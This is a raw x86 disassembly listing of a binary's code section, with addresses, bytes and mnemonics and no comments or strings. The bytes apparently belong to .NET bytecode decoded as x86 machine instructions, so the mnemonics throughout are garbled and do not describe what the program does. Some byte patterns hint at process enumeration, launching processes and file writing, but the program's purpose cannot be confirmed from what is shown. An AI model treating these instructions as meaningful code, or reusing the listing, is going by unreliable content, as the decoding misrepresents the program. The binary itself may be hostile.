  402b36:	00 00                	add    %al,(%eax)
  402b38:	07                   	pop    %es
  402b39:	00 00                	add    %al,(%eax)
  402b3b:	11 00                	adc    %eax,(%eax)
  402b3d:	00 73 4d             	add    %dh,0x4d(%ebx)
  402b40:	00 00                	add    %al,(%eax)
  402b42:	0a 0a                	or     (%edx),%cl
  402b44:	06                   	push   %es
  402b45:	72 79                	jb     0x402bc0
  402b47:	01 00                	add    %eax,(%eax)
  402b49:	70 6f                	jo     0x402bba
  402b4b:	4e                   	dec    %esi
  402b4c:	00 00                	add    %al,(%eax)
  402b4e:	0a 72 87             	or     -0x79(%edx),%dh
  402b51:	01 00                	add    %eax,(%eax)
  402b53:	70 6f                	jo     0x402bc4
  402b55:	4f                   	dec    %edi
  402b56:	00 00                	add    %al,(%eax)
  402b58:	0a 00                	or     (%eax),%al
  402b5a:	06                   	push   %es
  402b5b:	72 91                	jb     0x402aee
  402b5d:	01 00                	add    %eax,(%eax)
  402b5f:	70 6f                	jo     0x402bd0
  402b61:	4e                   	dec    %esi
  402b62:	00 00                	add    %al,(%eax)
  402b64:	0a 28                	or     (%eax),%ch
  402b66:	35 00 00 06 6f       	xor    $0x6f060000,%eax
  402b6b:	4f                   	dec    %edi
  402b6c:	00 00                	add    %al,(%eax)
  402b6e:	0a 00                	or     (%eax),%al
  402b70:	06                   	push   %es
  402b71:	6f                   	outsl  %ds:(%esi),(%dx)
  402b72:	50                   	push   %eax
  402b73:	00 00                	add    %al,(%eax)
  402b75:	0a 28                	or     (%eax),%ch
  402b77:	20 00                	and    %al,(%eax)
  402b79:	00 06                	add    %al,(%esi)
  402b7b:	00 28                	add    %ch,(%eax)
  402b7d:	51                   	push   %ecx
  402b7e:	00 00                	add    %al,(%eax)
  402b80:	0a 00                	or     (%eax),%al
  402b82:	17                   	pop    %ss
  402b83:	28 1a                	sub    %bl,(%edx)
  402b85:	00 00                	add    %al,(%eax)
  402b87:	06                   	push   %es
  402b88:	00 00                	add    %al,(%eax)
  402b8a:	de 05 26 00 00 de    	fiadds 0xde000026
  402b90:	00 2a                	add    %ch,(%edx)
  402b92:	00 00                	add    %al,(%eax)
  402b94:	01 10                	add    %edx,(%eax)
  402b96:	00 00                	add    %al,(%eax)
  402b98:	00 00                	add    %al,(%eax)
  402b9a:	01 00                	add    %eax,(%eax)
  402b9c:	4f                   	dec    %edi
  402b9d:	50                   	push   %eax
  402b9e:	00 05 0f 00 00 01    	add    %al,0x100000f
  402ba4:	1b 30                	sbb    (%eax),%esi
  402ba6:	02 00                	add    (%eax),%al
  402ba8:	2d 00 00 00 02       	sub    $0x2000000,%eax
  402bad:	00 00                	add    %al,(%eax)
  402baf:	11 00                	adc    %eax,(%eax)
  402bb1:	00 28                	add    %ch,(%eax)
  402bb3:	19 00                	sbb    %eax,(%eax)
  402bb5:	00 06                	add    %al,(%esi)
  402bb7:	2c 07                	sub    $0x7,%al
  402bb9:	28 12                	sub    %dl,(%edx)
  402bbb:	00 00                	add    %al,(%eax)
  402bbd:	06                   	push   %es
  402bbe:	2b 01                	sub    (%ecx),%eax
  402bc0:	16                   	push   %ss
  402bc1:	0a 06                	or     (%esi),%al
  402bc3:	2c 0f                	sub    $0xf,%al
  402bc5:	00 28                	add    %ch,(%eax)
  402bc7:	17                   	pop    %ss
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	17                   	pop    %ss
  402bcc:	58                   	pop    %eax
  402bcd:	28 18                	sub    %bl,(%eax)
  402bcf:	00 00                	add    %al,(%eax)
  402bd1:	06                   	push   %es
  402bd2:	00 00                	add    %al,(%eax)
  402bd4:	00 de                	add    %bl,%dh
  402bd6:	05 26 00 00 de       	add    $0xde000026,%eax
  402bdb:	00 2a                	add    %ch,(%edx)
  402bdd:	00 00                	add    %al,(%eax)
  402bdf:	00 01                	add    %al,(%ecx)
  402be1:	10 00                	adc    %al,(%eax)
  402be3:	00 00                	add    %al,(%eax)
  402be5:	00 01                	add    %al,(%ecx)
  402be7:	00 26                	add    %ah,(%esi)
  402be9:	27                   	daa
  402bea:	00 05 0f 00 00 01    	add    %al,0x100000f
  402bf0:	2e 73 14             	jae,pn 0x402c07
  402bf3:	00 00                	add    %al,(%eax)
  402bf5:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402bfb:	2a 1b                	sub    (%ebx),%bl
  402bfd:	30 05 00 aa 02 00    	xor    %al,0x2aa00
  402c03:	00 08                	add    %cl,(%eax)
  402c05:	00 00                	add    %al,(%eax)
  402c07:	11 00                	adc    %eax,(%eax)
  402c09:	00 7e 05             	add    %bh,0x5(%esi)
  402c0c:	00 00                	add    %al,(%eax)
  402c0e:	04 28                	add    $0x28,%al
  402c10:	52                   	push   %edx
  402c11:	00 00                	add    %al,(%eax)
  402c13:	0a 7e 06             	or     0x6(%esi),%bh
  402c16:	00 00                	add    %al,(%eax)
  402c18:	04 28                	add    $0x28,%al
  402c1a:	53                   	push   %ebx
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 73 54             	or     0x54(%ebx),%dh
  402c20:	00 00                	add    %al,(%eax)
  402c22:	0a 0a                	or     (%edx),%cl
  402c24:	28 55 00             	sub    %dl,0x0(%ebp)
  402c27:	00 0a                	add    %cl,(%edx)
  402c29:	6f                   	outsl  %ds:(%esi),(%dx)
  402c2a:	56                   	push   %esi
  402c2b:	00 00                	add    %al,(%eax)
  402c2d:	0a 6f 57             	or     0x57(%edi),%ch
  402c30:	00 00                	add    %al,(%eax)
  402c32:	0a 0b                	or     (%ebx),%cl
  402c34:	07                   	pop    %es
  402c35:	06                   	push   %es
  402c36:	6f                   	outsl  %ds:(%esi),(%dx)
  402c37:	58                   	pop    %eax
  402c38:	00 00                	add    %al,(%eax)
  402c3a:	0a 28                	or     (%eax),%ch
  402c3c:	59                   	pop    %ecx
  402c3d:	00 00                	add    %al,(%eax)
  402c3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402c42:	39 4a 02             	cmp    %ecx,0x2(%edx)
  402c45:	00 00                	add    %al,(%eax)
  402c47:	00 00                	add    %al,(%eax)
  402c49:	28 5a 00             	sub    %bl,0x0(%edx)
  402c4c:	00 0a                	add    %cl,(%edx)
  402c4e:	13 06                	adc    (%esi),%eax
  402c50:	16                   	push   %ss
  402c51:	13 07                	adc    (%edi),%eax
  402c53:	2b 3d 11 06 11 07    	sub    0x7110611,%edi
  402c59:	9a 13 08 00 00 11 08 	lcall  $0x811,$0x813
  402c60:	6f                   	outsl  %ds:(%esi),(%dx)
  402c61:	56                   	push   %esi
  402c62:	00 00                	add    %al,(%eax)
  402c64:	0a 6f 57             	or     0x57(%edi),%ch
  402c67:	00 00                	add    %al,(%eax)
  402c69:	0a 06                	or     (%esi),%al
  402c6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402c6c:	58                   	pop    %eax
  402c6d:	00 00                	add    %al,(%eax)
  402c6f:	0a 28                	or     (%eax),%ch
  402c71:	1f                   	pop    %ds
  402c72:	00 00                	add    %al,(%eax)
  402c74:	0a 13                	or     (%ebx),%dl
  402c76:	09 11                	or     %edx,(%ecx)
  402c78:	09 2c 08             	or     %ebp,(%eax,%ecx,1)
  402c7b:	11 08                	adc    %ecx,(%eax)
  402c7d:	6f                   	outsl  %ds:(%esi),(%dx)
  402c7e:	5b                   	pop    %ebx
  402c7f:	00 00                	add    %al,(%eax)
  402c81:	0a 00                	or     (%eax),%al
  402c83:	00 de                	add    %bl,%dh
  402c85:	05 26 00 00 de       	add    $0xde000026,%eax
  402c8a:	00 00                	add    %al,(%eax)
  402c8c:	11 07                	adc    %eax,(%edi)
  402c8e:	17                   	pop    %ss
  402c8f:	58                   	pop    %eax
  402c90:	13 07                	adc    (%edi),%eax
  402c92:	11 07                	adc    %eax,(%edi)
  402c94:	11 06                	adc    %eax,(%esi)
  402c96:	8e 69 32             	mov    0x32(%ecx),%gs
  402c99:	bb 28 30 00 00       	mov    $0x3028,%ebx
  402c9e:	06                   	push   %es
  402c9f:	13 0a                	adc    (%edx),%ecx
  402ca1:	11 0a                	adc    %ecx,(%edx)
  402ca3:	2c 74                	sub    $0x74,%al
  402ca5:	00 73 5c             	add    %dh,0x5c(%ebx)
  402ca8:	00 00                	add    %al,(%eax)
  402caa:	0a 13                	or     (%ebx),%dl
  402cac:	0b 11                	or     (%ecx),%edx
  402cae:	0b 72 a1             	or     -0x5f(%edx),%esi
  402cb1:	01 00                	add    %eax,(%eax)
  402cb3:	70 6f                	jo     0x402d24
  402cb5:	5d                   	pop    %ebp
  402cb6:	00 00                	add    %al,(%eax)
  402cb8:	0a 00                	or     (%eax),%al
  402cba:	11 0b                	adc    %ecx,(%ebx)
  402cbc:	1b 8d 4b 00 00 01    	sbb    0x100004b(%ebp),%ecx
  402cc2:	25 16 72 a9 01       	and    $0x1a97216,%eax
  402cc7:	00 70 a2             	add    %dh,-0x5e(%eax)
  402cca:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  402ccf:	00 00                	add    %al,(%eax)
  402cd1:	0a 28                	or     (%eax),%ch
  402cd3:	5f                   	pop    %edi
  402cd4:	00 00                	add    %al,(%eax)
  402cd6:	0a a2 25 18 72 13    	or     0x13721825(%edx),%ah
  402cdc:	02 00                	add    (%eax),%al
  402cde:	70 a2                	jo     0x402c82
  402ce0:	25 19 06 6f 58       	and    $0x586f0619,%eax
  402ce5:	00 00                	add    %al,(%eax)
  402ce7:	0a a2 25 1a 72 25    	or     0x25721a25(%edx),%ah
  402ced:	02 00                	add    (%eax),%al
  402cef:	70 a2                	jo     0x402c93
  402cf1:	28 60 00             	sub    %ah,0x0(%eax)
  402cf4:	00 0a                	add    %cl,(%edx)
  402cf6:	6f                   	outsl  %ds:(%esi),(%dx)
  402cf7:	61                   	popa
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	0a 00                	or     (%eax),%al
  402cfc:	11 0b                	adc    %ecx,(%ebx)
  402cfe:	17                   	pop    %ss
  402cff:	6f                   	outsl  %ds:(%esi),(%dx)
  402d00:	62 00                	bound  %eax,(%eax)
  402d02:	00 0a                	add    %cl,(%edx)
  402d04:	00 11                	add    %dl,(%ecx)
  402d06:	0b 17                	or     (%edi),%edx
  402d08:	6f                   	outsl  %ds:(%esi),(%dx)
  402d09:	63 00                	arpl   %eax,(%eax)
  402d0b:	00 0a                	add    %cl,(%edx)
  402d0d:	00 11                	add    %dl,(%ecx)
  402d0f:	0b 28                	or     (%eax),%ebp
  402d11:	64 00 00             	add    %al,%fs:(%eax)
  402d14:	0a 26                	or     (%esi),%ah
  402d16:	00 2b                	add    %ch,(%ebx)
  402d18:	52                   	push   %edx
  402d19:	00 7e 65             	add    %bh,0x65(%esi)
  402d1c:	00 00                	add    %al,(%eax)
  402d1e:	0a 72 39             	or     0x39(%edx),%dh
  402d21:	02 00                	add    (%eax),%al
  402d23:	70 28                	jo     0x402d4d
  402d25:	66 00 00             	data16 add %al,(%eax)
  402d28:	0a 18                	or     (%eax),%bl
  402d2a:	6f                   	outsl  %ds:(%esi),(%dx)
  402d2b:	67 00 00             	add    %al,(%bx,%si)
  402d2e:	0a 13                	or     (%ebx),%dl
  402d30:	0c 00                	or     $0x0,%al
  402d32:	11 0c 06             	adc    %ecx,(%esi,%eax,1)
  402d35:	6f                   	outsl  %ds:(%esi),(%dx)
  402d36:	5e                   	pop    %esi
  402d37:	00 00                	add    %al,(%eax)
  402d39:	0a 28                	or     (%eax),%ch
  402d3b:	5f                   	pop    %edi
  402d3c:	00 00                	add    %al,(%eax)
  402d3e:	0a 72 97             	or     -0x69(%edx),%dh
  402d41:	02 00                	add    (%eax),%al
  402d43:	70 06                	jo     0x402d4b
  402d45:	6f                   	outsl  %ds:(%esi),(%dx)
  402d46:	58                   	pop    %eax
  402d47:	00 00                	add    %al,(%eax)
  402d49:	0a 72 97             	or     -0x69(%edx),%dh
  402d4c:	02 00                	add    (%eax),%al
  402d4e:	70 28                	jo     0x402d78
  402d50:	40                   	inc    %eax
  402d51:	00 00                	add    %al,(%eax)
  402d53:	0a 6f 68             	or     0x68(%edi),%ch
  402d56:	00 00                	add    %al,(%eax)
  402d58:	0a 00                	or     (%eax),%al
  402d5a:	00 de                	add    %bl,%dh
  402d5c:	0d 11 0c 2c 08       	or     $0x82c0c11,%eax
  402d61:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  402d64:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402d69:	dc 00                	faddl  (%eax)
  402d6b:	06                   	push   %es
  402d6c:	6f                   	outsl  %ds:(%esi),(%dx)
  402d6d:	58                   	pop    %eax
  402d6e:	00 00                	add    %al,(%eax)
  402d70:	0a 28                	or     (%eax),%ch
  402d72:	69 00 00 0a 13 0d    	imul   $0xd130a00,(%eax),%eax
  402d78:	11 0d 2c 19 00 06    	adc    %ecx,0x600192c
  402d7e:	6f                   	outsl  %ds:(%esi),(%dx)
  402d7f:	58                   	pop    %eax
  402d80:	00 00                	add    %al,(%eax)
  402d82:	0a 28                	or     (%eax),%ch
  402d84:	6a 00                	push   $0x0
  402d86:	00 0a                	add    %cl,(%edx)
  402d88:	00 20                	add    %ah,(%eax)
  402d8a:	e8 03 00 00 28       	call   0x28402d92
  402d8f:	10 00                	adc    %al,(%eax)
  402d91:	00 0a                	add    %cl,(%edx)
  402d93:	00 00                	add    %al,(%eax)
  402d95:	06                   	push   %es
  402d96:	6f                   	outsl  %ds:(%esi),(%dx)
  402d97:	58                   	pop    %eax
  402d98:	00 00                	add    %al,(%eax)
  402d9a:	0a 17                	or     (%edi),%dl
  402d9c:	73 6b                	jae    0x402e09
  402d9e:	00 00                	add    %al,(%eax)
  402da0:	0a 0d 07 28 6c 00    	or     0x6c2807,%cl
  402da6:	00 0a                	add    %cl,(%edx)
  402da8:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  402dab:	11 04 16             	adc    %eax,(%esi,%edx,1)
  402dae:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  402db1:	69 6f 48 00 00 0a 00 	imul   $0xa0000,0x48(%edi),%ebp
  402db8:	28 31                	sub    %dh,(%ecx)
  402dba:	00 00                	add    %al,(%eax)
  402dbc:	06                   	push   %es
  402dbd:	00 28                	add    %ch,(%eax)
  402dbf:	6d                   	insl   (%dx),%es:(%edi)
  402dc0:	00 00                	add    %al,(%eax)
  402dc2:	0a 72 9b             	or     -0x65(%edx),%dh
  402dc5:	02 00                	add    (%eax),%al
  402dc7:	70 28                	jo     0x402df1
  402dc9:	6e                   	outsb  %ds:(%esi),(%dx)
  402dca:	00 00                	add    %al,(%eax)
  402dcc:	0a 13                	or     (%ebx),%dl
  402dce:	05 11 05 73 6f       	add    $0x6f730511,%eax
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	0a 13                	or     (%ebx),%dl
  402dd7:	0e                   	push   %cs
  402dd8:	00 11                	add    %dl,(%ecx)
  402dda:	0e                   	push   %cs
  402ddb:	72 a5                	jb     0x402d82
  402ddd:	02 00                	add    (%eax),%al
  402ddf:	70 6f                	jo     0x402e50
  402de1:	70 00                	jo     0x402de3
  402de3:	00 0a                	add    %cl,(%edx)
  402de5:	00 11                	add    %dl,(%ecx)
  402de7:	0e                   	push   %cs
  402de8:	72 b9                	jb     0x402da3
  402dea:	02 00                	add    (%eax),%al
  402dec:	70 6f                	jo     0x402e5d
  402dee:	70 00                	jo     0x402df0
  402df0:	00 0a                	add    %cl,(%edx)
  402df2:	00 11                	add    %dl,(%ecx)
  402df4:	0e                   	push   %cs
  402df5:	72 d9                	jb     0x402dd0
  402df7:	02 00                	add    (%eax),%al
  402df9:	70 06                	jo     0x402e01
  402dfb:	6f                   	outsl  %ds:(%esi),(%dx)
  402dfc:	58                   	pop    %eax
  402dfd:	00 00                	add    %al,(%eax)
  402dff:	0a 72 97             	or     -0x69(%edx),%dh
  402e02:	02 00                	add    (%eax),%al
  402e04:	70 28                	jo     0x402e2e
  402e06:	40                   	inc    %eax
  402e07:	00 00                	add    %al,(%eax)
  402e09:	0a 6f 70             	or     0x70(%edi),%ch
  402e0c:	00 00                	add    %al,(%eax)
  402e0e:	0a 00                	or     (%eax),%al
  402e10:	11 0e                	adc    %ecx,(%esi)
  402e12:	72 ef                	jb     0x402e03
  402e14:	02 00                	add    (%eax),%al
  402e16:	70 28                	jo     0x402e40
  402e18:	71 00                	jno    0x402e1a
  402e1a:	00 0a                	add    %cl,(%edx)
  402e1c:	28 6e 00             	sub    %ch,0x0(%esi)
  402e1f:	00 0a                	add    %cl,(%edx)
  402e21:	6f                   	outsl  %ds:(%esi),(%dx)
  402e22:	70 00                	jo     0x402e24
  402e24:	00 0a                	add    %cl,(%edx)
  402e26:	00 11                	add    %dl,(%ecx)
  402e28:	0e                   	push   %cs
  402e29:	72 f7                	jb     0x402e22
  402e2b:	02 00                	add    (%eax),%al
  402e2d:	70 11                	jo     0x402e40
  402e2f:	05 28 72 00 00       	add    $0x7228,%eax
  402e34:	0a 72 03             	or     0x3(%edx),%dh
  402e37:	03 00                	add    (%eax),%eax
  402e39:	70 28                	jo     0x402e63
  402e3b:	40                   	inc    %eax
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	0a 6f 70             	or     0x70(%edi),%ch
  402e41:	00 00                	add    %al,(%eax)
  402e43:	0a 00                	or     (%eax),%al
  402e45:	00 de                	add    %bl,%dh
  402e47:	0d 11 0e 2c 08       	or     $0x82c0e11,%eax
  402e4c:	11 0e                	adc    %ecx,(%esi)
  402e4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e4f:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402e54:	dc 73 5c             	fdivl  0x5c(%ebx)
  402e57:	00 00                	add    %al,(%eax)
  402e59:	0a 25 11 05 6f 5d    	or     0x5d6f0511,%ah
  402e5f:	00 00                	add    %al,(%eax)
  402e61:	0a 00                	or     (%eax),%al
  402e63:	25 17 6f 63 00       	and    $0x636f17,%eax
  402e68:	00 0a                	add    %cl,(%edx)
  402e6a:	00 25 16 6f 73 00    	add    %ah,0x736f16
  402e70:	00 0a                	add    %cl,(%edx)
  402e72:	00 25 16 6f 74 00    	add    %ah,0x746f16
  402e78:	00 0a                	add    %cl,(%edx)
  402e7a:	00 25 17 6f 62 00    	add    %ah,0x626f17
  402e80:	00 0a                	add    %cl,(%edx)
  402e82:	00 28                	add    %ch,(%eax)
  402e84:	64 00 00             	add    %al,%fs:(%eax)
  402e87:	0a 26                	or     (%esi),%ah
  402e89:	16                   	push   %ss
  402e8a:	28 12                	sub    %dl,(%edx)
  402e8c:	00 00                	add    %al,(%eax)
  402e8e:	0a 00                	or     (%eax),%al
  402e90:	00 00                	add    %al,(%eax)
  402e92:	de 1d 13 0f 00 72    	ficomps 0x72000f13
  402e98:	13 03                	adc    (%ebx),%eax
  402e9a:	00 70 11             	add    %dh,0x11(%eax)
  402e9d:	0f 6f 75 00          	movq   0x0(%ebp),%mm6
  402ea1:	00 0a                	add    %cl,(%edx)
  402ea3:	28 6e 00             	sub    %ch,0x0(%esi)
  402ea6:	00 0a                	add    %cl,(%edx)
  402ea8:	28 2e                	sub    %ch,(%esi)
  402eaa:	00 00                	add    %al,(%eax)
  402eac:	0a 00                	or     (%eax),%al
  402eae:	00 de                	add    %bl,%dh
  402eb0:	00 2a                	add    %ch,(%edx)
  402eb2:	00 00                	add    %al,(%eax)
  402eb4:	41                   	inc    %ecx
  402eb5:	64 00 00             	add    %al,%fs:(%eax)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	00 00                	add    %al,(%eax)
  402ebc:	55                   	push   %ebp
  402ebd:	00 00                	add    %al,(%eax)
  402ebf:	00 29                	add    %ch,(%ecx)
  402ec1:	00 00                	add    %al,(%eax)
  402ec3:	00 7e 00             	add    %bh,0x0(%esi)
  402ec6:	00 00                	add    %al,(%eax)
  402ec8:	05 00 00 00 0f       	add    $0xf000000,%eax
  402ecd:	00 00                	add    %al,(%eax)
  402ecf:	01 02                	add    %eax,(%edx)
  402ed1:	00 00                	add    %al,(%eax)
  402ed3:	00 29                	add    %ch,(%ecx)
  402ed5:	01 00                	add    %eax,(%eax)
  402ed7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  402eda:	00 00                	add    %al,(%eax)
  402edc:	55                   	push   %ebp
  402edd:	01 00                	add    %eax,(%eax)
  402edf:	00 0d 00 00 00 00    	add    %cl,0x0
  402ee5:	00 00                	add    %al,(%eax)
  402ee7:	00 02                	add    %al,(%edx)
  402ee9:	00 00                	add    %al,(%eax)
  402eeb:	00 d0                	add    %dl,%al
  402eed:	01 00                	add    %eax,(%eax)
  402eef:	00 70 00             	add    %dh,0x0(%eax)
  402ef2:	00 00                	add    %al,(%eax)
  402ef4:	40                   	inc    %eax
  402ef5:	02 00                	add    (%eax),%al
  402ef7:	00 0d 00 00 00 00    	add    %cl,0x0
  402efd:	00 00                	add    %al,(%eax)
  402eff:	00 00                	add    %al,(%eax)
  402f01:	00 00                	add    %al,(%eax)
  402f03:	00 01                	add    %al,(%ecx)
  402f05:	00 00                	add    %al,(%eax)
  402f07:	00 8b 02 00 00 8c    	add    %cl,-0x73fffffe(%ebx)
  402f0d:	02 00                	add    (%eax),%al
  402f0f:	00 1d 00 00 00 12    	add    %bl,0x12000000
  402f15:	00 00                	add    %al,(%eax)
  402f17:	01 22                	add    %esp,(%edx)
  402f19:	02 28                	add    (%eax),%ch
  402f1b:	14 00                	adc    $0x0,%al
  402f1d:	00 0a                	add    %cl,(%edx)
  402f1f:	00 2a                	add    %ch,(%edx)
  402f21:	00 00                	add    %al,(%eax)
  402f23:	00 13                	add    %dl,(%ebx)
  402f25:	30 01                	xor    %al,(%ecx)
  402f27:	00 31                	add    %dh,(%ecx)
  402f29:	00 00                	add    %al,(%eax)
  402f2b:	00 02                	add    %al,(%edx)
  402f2d:	00 00                	add    %al,(%eax)
  402f2f:	11 00                	adc    %eax,(%eax)
  402f31:	28 29                	sub    %ch,(%ecx)
  402f33:	00 00                	add    %al,(%eax)
  402f35:	06                   	push   %es
  402f36:	2d 1c 28 2a 00       	sub    $0x2a281c,%eax
  402f3b:	00 06                	add    %al,(%esi)
  402f3d:	2d 15 28 2b 00       	sub    $0x2b2815,%eax
  402f42:	00 06                	add    %al,(%esi)
  402f44:	2d 0e 28 27 00       	sub    $0x27280e,%eax
  402f49:	00 06                	add    %al,(%esi)
  402f4b:	2d 07 28 28 00       	sub    $0x282807,%eax
  402f50:	00 06                	add    %al,(%esi)
  402f52:	2b 01                	sub    (%ecx),%eax
  402f54:	17                   	pop    %ss
  402f55:	0a 06                	or     (%esi),%al
  402f57:	2c 07                	sub    $0x7,%al
  402f59:	14 28                	adc    $0x28,%al
  402f5b:	76 00                	jbe    0x402f5d
  402f5d:	00 0a                	add    %cl,(%edx)
  402f5f:	00 2a                	add    %ch,(%edx)
  402f61:	00 00                	add    %al,(%eax)
  402f63:	00 1b                	add    %bl,(%ebx)
  402f65:	30 02                	xor    %al,(%edx)
  402f67:	00 3c 00             	add    %bh,(%eax,%eax,1)
  402f6a:	00 00                	add    %al,(%eax)
  402f6c:	09 00                	or     %eax,(%eax)
  402f6e:	00 11                	add    %dl,(%ecx)
  402f70:	00 00                	add    %al,(%eax)
  402f72:	21 00                	and    %eax,(%eax)
  402f74:	22 e2                	and    %dl,%ah
  402f76:	33 0e                	xor    (%esi),%ecx
  402f78:	00 00                	add    %al,(%eax)
  402f7a:	00 0a                	add    %cl,(%edx)
  402f7c:	28 77 00             	sub    %dh,0x0(%edi)
  402f7f:	00 0a                	add    %cl,(%edx)
  402f81:	28 78 00             	sub    %bh,0x0(%eax)
  402f84:	00 0a                	add    %cl,(%edx)
  402f86:	73 79                	jae    0x403001
  402f88:	00 00                	add    %al,(%eax)
  402f8a:	0a 28                	or     (%eax),%ch
  402f8c:	7a 00                	jp     0x402f8e
  402f8e:	00 0a                	add    %cl,(%edx)
  402f90:	06                   	push   %es
  402f91:	fe 02                	incb   (%edx)
  402f93:	16                   	push   %ss
  402f94:	fe 01                	incb   (%ecx)
  402f96:	0b 07                	or     (%edi),%eax
  402f98:	2c 04                	sub    $0x4,%al
  402f9a:	17                   	pop    %ss
  402f9b:	0c de                	or     $0xde,%al
  402f9d:	0c 00                	or     $0x0,%al
  402f9f:	de 05 26 00 00 de    	fiadds 0xde000026
  402fa5:	00 16                	add    %dl,(%esi)
  402fa7:	0c 2b                	or     $0x2b,%al
  402fa9:	00 08                	add    %cl,(%eax)
  402fab:	2a 01                	sub    (%ecx),%al
  402fad:	10 00                	adc    %al,(%eax)
  402faf:	00 00                	add    %al,(%eax)
  402fb1:	00 01                	add    %al,(%ecx)
  402fb3:	00 30                	add    %dh,(%eax)
  402fb5:	31 00                	xor    %eax,(%eax)
  402fb7:	05 0f 00 00 01       	add    $0x100000f,%eax
  402fbc:	1b 30                	sbb    (%eax),%esi
  402fbe:	02 00                	add    (%eax),%al
  402fc0:	32 00                	xor    (%eax),%al
  402fc2:	00 00                	add    %al,(%eax)
  402fc4:	0a 00                	or     (%eax),%al
  402fc6:	00 11                	add    %dl,(%ecx)
  402fc8:	00 00                	add    %al,(%eax)
  402fca:	73 7b                	jae    0x403047
  402fcc:	00 00                	add    %al,(%eax)
  402fce:	0a 28                	or     (%eax),%ch
  402fd0:	7c 00                	jl     0x402fd2
  402fd2:	00 0a                	add    %cl,(%edx)
  402fd4:	6f                   	outsl  %ds:(%esi),(%dx)
  402fd5:	7d 00                	jge    0x402fd7
  402fd7:	00 0a                	add    %cl,(%edx)
  402fd9:	72 37                	jb     0x403012
  402fdb:	03 00                	add    (%eax),%eax
  402fdd:	70 6f                	jo     0x40304e
  402fdf:	7e 00                	jle    0x402fe1
  402fe1:	00 0a                	add    %cl,(%edx)
  402fe3:	0a 06                	or     (%esi),%al
  402fe5:	2c 05                	sub    $0x5,%al
  402fe7:	00 17                	add    %dl,(%edi)
  402fe9:	0b de                	or     %esi,%ebx
  402feb:	0c 00                	or     $0x0,%al
  402fed:	de 05 26 00 00 de    	fiadds 0xde000026
  402ff3:	00 16                	add    %dl,(%esi)
  402ff5:	0b 2b                	or     (%ebx),%ebp
  402ff7:	00 07                	add    %al,(%edi)
  402ff9:	2a 00                	sub    (%eax),%al
  402ffb:	00 01                	add    %al,(%ecx)
  402ffd:	10 00                	adc    %al,(%eax)
  402fff:	00 00                	add    %al,(%eax)
  403001:	00 01                	add    %al,(%ecx)
  403003:	00 26                	add    %ah,(%esi)
  403005:	27                   	daa
  403006:	00 05 0f 00 00 01    	add    %al,0x100000f
  40300c:	1b 30                	sbb    (%eax),%esi
  40300e:	02 00                	add    (%eax),%al
  403010:	ed                   	in     (%dx),%eax
  403011:	00 00                	add    %al,(%eax)
  403013:	00 0b                	add    %cl,(%ebx)
  403015:	00 00                	add    %al,(%eax)
  403017:	11 00                	adc    %eax,(%eax)
  403019:	00 72 3d             	add    %dh,0x3d(%edx)
  40301c:	03 00                	add    (%eax),%eax
  40301e:	70 73                	jo     0x403093
  403020:	7f 00                	jg     0x403022
  403022:	00 0a                	add    %cl,(%edx)
  403024:	0a 00                	or     (%eax),%al
  403026:	06                   	push   %es
  403027:	6f                   	outsl  %ds:(%esi),(%dx)
  403028:	80 00 00             	addb   $0x0,(%eax)
  40302b:	0a 0b                	or     (%ebx),%cl
  40302d:	00 00                	add    %al,(%eax)
  40302f:	07                   	pop    %es
  403030:	6f                   	outsl  %ds:(%esi),(%dx)
  403031:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  403037:	86 00                	xchg   %al,(%eax)
  403039:	00 00                	add    %al,(%eax)
  40303b:	08 6f 82             	or     %ch,-0x7e(%edi)
  40303e:	00 00                	add    %al,(%eax)
  403040:	0a 0d 00 09 72 83    	or     0x83720900,%cl
  403046:	03 00                	add    (%eax),%eax
  403048:	70 6f                	jo     0x4030b9
  40304a:	83 00 00             	addl   $0x0,(%eax)
  40304d:	0a 6f 33             	or     0x33(%edi),%ch
  403050:	00 00                	add    %al,(%eax)
  403052:	0a 6f 7d             	or     0x7d(%edi),%ch
  403055:	00 00                	add    %al,(%eax)
  403057:	0a 13                	or     (%ebx),%dl
  403059:	04 11                	add    $0x11,%al
  40305b:	04 72                	add    $0x72,%al
  40305d:	9d                   	popf
  40305e:	03 00                	add    (%eax),%eax
  403060:	70 28                	jo     0x40308a
  403062:	1f                   	pop    %ds
  403063:	00 00                	add    %al,(%eax)
  403065:	0a 2c 21             	or     (%ecx,%eiz,1),%ch
  403068:	09 72 c9             	or     %esi,-0x37(%edx)
  40306b:	03 00                	add    (%eax),%eax
  40306d:	70 6f                	jo     0x4030de
  40306f:	83 00 00             	addl   $0x0,(%eax)
  403072:	0a 6f 33             	or     0x33(%edi),%ch
  403075:	00 00                	add    %al,(%eax)
  403077:	0a 6f 84             	or     -0x7c(%edi),%ch
  40307a:	00 00                	add    %al,(%eax)
  40307c:	0a 72 d5             	or     -0x2b(%edx),%dh
  40307f:	03 00                	add    (%eax),%eax
  403081:	70 6f                	jo     0x4030f2
  403083:	7e 00                	jle    0x403085
  403085:	00 0a                	add    %cl,(%edx)
  403087:	2d 2a 11 04 72       	sub    $0x7204112a,%eax
  40308c:	e5 03                	in     $0x3,%eax
  40308e:	00 70 6f             	add    %dh,0x6f(%eax)
  403091:	7e 00                	jle    0x403093
  403093:	00 0a                	add    %cl,(%edx)
  403095:	2d 1c 09 72 c9       	sub    $0xc972091c,%eax
  40309a:	03 00                	add    (%eax),%eax
  40309c:	70 6f                	jo     0x40310d
  40309e:	83 00 00             	addl   $0x0,(%eax)
  4030a1:	0a 6f 33             	or     0x33(%edi),%ch
  4030a4:	00 00                	add    %al,(%eax)
  4030a6:	0a 72 f3             	or     -0xd(%edx),%dh
